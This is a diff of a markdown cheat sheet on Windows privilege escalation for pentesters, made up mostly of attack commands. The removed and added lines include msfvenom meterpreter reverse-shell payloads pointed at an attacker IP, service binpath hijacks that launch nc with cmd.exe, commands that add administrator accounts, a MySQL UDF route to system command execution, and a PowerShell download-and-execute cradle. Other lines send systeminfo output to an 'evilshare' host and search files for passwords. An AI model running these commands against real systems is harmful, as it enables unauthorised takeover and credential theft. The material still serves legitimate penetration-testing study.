@@ -1,91 +1,202 @@
-#### Task Scheduler
-```bash
-tasklist /svc
-tasklist /v
-net start
-sc query
-schtasks /query /fo LIST 2>nul | findstr TaskName
-msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIP> LPORT=<attackerPort> -f exe -o Payload.exe
-upload -f Payload.exe
-net start "Task Scheduler"
-time - set newtime
-at 06:42 /interactive "<Path>\Payload.exe"
-
-## https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
-```
-
-#### Unquoted Service Path
-```bash
-wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
-icacls "C:\Program Files (x86)\Program Folder"
-F = Full Control, CI = Container Inherit, OI = Object Inherit
-msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIp> LPORT=<attackerPort> -f exe -o Payload.exe
-cd "../../../Program Files (x86)/Program Folder"
-upload -f Payload.exe
-shutdown /r /t 0
-getuid
-
-## Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
-```
-
-#### Vulnerable Services and Files and Folder Permission
-
-a. Insecure Service Permission -  Search for services that have a binary path (binpath) property which can be modified by non-Admin users - in that case change the binpath to execute a command of your own.
-```
-1. Check permission of the file - icalcs <file>
-2. Use accesschk.exe - Sysinternal tool -
-	a. accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-	b. accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
-	c. accesschk.exe -qdws Users C:\Windows\
-	d. accesschk.exe -ucqv <Vulnerable_Service>					#1
-	e. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service.
-3. sc qc <Vulnerable_Service>										#2
-4. sc config <Vulnerable_Service> binpath= "C:\nc.exe -nv 127.0.0.1 <port> -e C:\WINDOWS\System32\cmd.exe"	#3
-5. sc config "Vulnerable Service" binpath= "net user <user> <password>@ /add"									#or
-6. sc config <Vulnerable_Service> obj= ".\LocalSystem" password= ""	#4	#no need to do if performed #3
-7. sc qc <Vulnerable_Service>	#5
-8. net start <Vulnerable_Service>	#6
-9. Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
-```
-**b. Insecure Registry Permissions**
-```
-1. Use tool - subinacl.exe
-2. subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
-3. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIp> LPORT=<attackerPort> -f exe -o Payload.exe
-4. upload -f Payload.exe
-5. reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "<Path>\Payload.exe" /f
-6. shutdown /r /t 0
-7. getuid
-8. reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
-```
-
-#### Add user
+# Kernal Exploits
 ```powershell
-net user hacker hacker /add
-net localgroup administrators hacker /add
+## Kernal exploit are very unstable. Should only use as a last resort
+## Use Windows Exploit Suggester
+https://github.com/bitsadmin/wesng
+
+## Precompiled kernal exploits
+https://github.com/SecWiki/windows-kernel-exploits
+
+## Enumerate missing KBs and suggest exploits
+https://github.com/rasta-mouse/Watson
+
+## On Victim host, cat sysinfo to txt file
+systeminfo > \\0.0.0.0\evilshare\systeminfo.txt
+
+## Run watson against systeminfo.txt
+python wes.py /evilshare/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
+
+## Find cve exploit, transfer a .exe rev shell to victim and start nc on attacker host
+nc -nvlp 8989
+
+## Run compiled binary on victim host to execute revshell
+.\cve-8120-x64.exe C:\Users\Public\rev.exe
+## Should get SYSTEM on nc listener if done correctly
+
 ```
 
-#### Check Firewall
+# Service Exploits
 ```powershell
-netsh firewall show state
-netsh firewall show config
-netsh advfirewall firewall show rule name=all
-netsh advfirewall export "firewall.txt"
+## Useful service cmds
+## Query the config of a service
+sc.exe qc <name>
+## Query the current status of a service
+sc.exe query <name>
+##Modify a config option of a service
+sc.exe config <name> <option>= <value>
+##  Start/stop a service
+net start/stop <name>
 ```
 
-#### Running Process as Administrator
+### Service Misconfigurations
+### Insecure Misconfig Permissions
 ```powershell
-ps aux
-**MySQL**
-USE mysql;
-CREATE TABLE npn(line blob);
-INSERT INTO npn values(load_file('<Path>/lib_mysqludf_sys.dll'));
-SELECT * FROM mysql.npn INTO DUMPFILE '<Path>/lib_mysqludf_sys_32.dll';
-CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
-SELECT sys_exec("net user npn npn12345678 /add");
-SELECT sys_exec("net localgroup Administrators npn /add");
-## https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+## If user has permissions to change the config of a service white run with SYSTEM priv, we can change the executable to one of ours.
+## If you cannot start/stop the service, you may not work.
+
+## Use can use winpeas to enum services information
+.\winpeasany.exe quiet servicesinfo
+## Verify winpeas info w/ accesschk Look for service change config,start/stop permissions.
+.\accesschk.exe /accepteula -uwcqv user <servicename>
+## Query the service to see its config
+sc qc <name>
+## if u see 'Service_start_name: localsystem' = SYSTEM 
+## Stop the service
+net stop <servicename>
+## Change the services binary path to your reverseshell.exe
+sc config <servicename> binpath= "\"C:\User\Public\rev.exe\""
+## Start yo' listener on local host
+sudo nc -nvlp 8989
+## start service 
+net start <servicename>
 ```
+
+### Unquoted Service Path
+```powershell
+##Executables in Windows can be run w/o using thie extension using their extension (e.g. "whoami.exe" can be exectuable by type just "whoami").
+## Some executables take more than 1 argument, separated by spaces. E.g cmd.exe arg1 arg2 arg3.
+## This type of buzz leads to ambiguity when using abslute paths that are unquoted and contain spaces.
+
+## Example of unquoted path: C:\Program Files\Clients App\program.exe
+## This us, this runs program.exe. To Windows, C:\Program could be the executable with the two arguments "Files\Clients" and "App\program.exe".
+## Windows resolves this ambiguity by checking each of the possibilities.
+## If u can write to a location Windows check before the actual executable u can trick the service into executing it instead. lol
+```
+
+```powershell
+## Use winpeas to check or powerup if you have powershell.
+.\winpeasany.exe quiet servicesinfo
+OR
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘http://0.0.0.0/PowerUp.ps1’);Invoke-AllChecks”
+
+## verify u have start/stop access
+.\accesschk.exe /accepteula -ucqv <service>
+## Check write permissions on each directory in the binary PATH
+.\accesschk.exe /accepteula -uwdq C:\
+.\accesschk.exe /accepteula -uwdq "C:\Program Files"
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+## Copy ur revshell.exe to on the binary paths you have access to (builtin\users)
+copy revshell.exe .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\rev.exe"
+## Start nc on local host and then start the service.
+```
+
+## Weak Registry Permissions
+```powershell
+## Windows registry stores entries for each service.
+## Since registry entries can have ACLs, if the ACl is misconfigured it could modify a services configuration even if we cannot modify the service directly.
+
+## In winpeas output, you want to check under  the 'Looking if you can modify any service registry' results
+
+powershell -exec bypass
+
+Get-Acl <reg-path-from-winpeas> | Format-List
+
+.\accesschk.exe /accepteula -uvwqk <reg-path-from-winpeas>
+##check to see if you can restart service
+.\accesschk.exe /accepteula -ucqv -user regsvc
+
+reg query <reg-path-from-winpeas>
+## Check imagepath from above cmd. see if object runs as local system. If yes, overwrite the imagepath to your rev shell.
+ reg add <reg-path-from-winpeas> /v ImagePath /t REG_EXPAND_SZ /d C:\User\Public\rev.exe /f
+
+## Start your listener and then start the service.
+```
+
+## Insecure Service Excutables
+```powershell
+## If the og service executable is modifiable by our user, we can replace it with our rev shell exe. Create a backup if exploiting in IRL.
+## Check Winpeas results for Service Info.
+```
+
+## DLL Hijacking
+```powershell
+## DLL = Dynamic-link library. A service will try to load parts of the program from a library clled DLL files. Whatever functionality the DLL provides will be executed with the same privileges as the service that loaded it. 
+## If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.
+
+## A more common misconfig is when a DLL is missing from the system, and our user has write permissions to a directory within the PATH that windows is searching for the DLL in. This process is very manual.
+
+## If you find a DLL missing PATH, you can use msfvenom to create a rev shell DLL.
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #### DLL Hijacking
 ```powershell
@@ -102,11 +213,7 @@ dir c:\ /s /b /c | fin dstr /si *vnc.ini
 findstr /si password *.txt | *.xml | *.ini
 findstr /si pass *.txt | *.xml | *.ini
 ```
-#### Kernel Exploits
-```powershell
-systeminfo
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-```
+
 #### Port Forwarding
 ```powershell
 Upload plink.exe to target.
@@ -114,10 +221,4 @@ Start SSH on your attacking machine.
 plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 ```
-
-#### Metasploit - Post exploitation
-```bash
-post/windows/gather/enum_patches
-post/multi/recon/local_exploit_suggester
-https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/
 ```
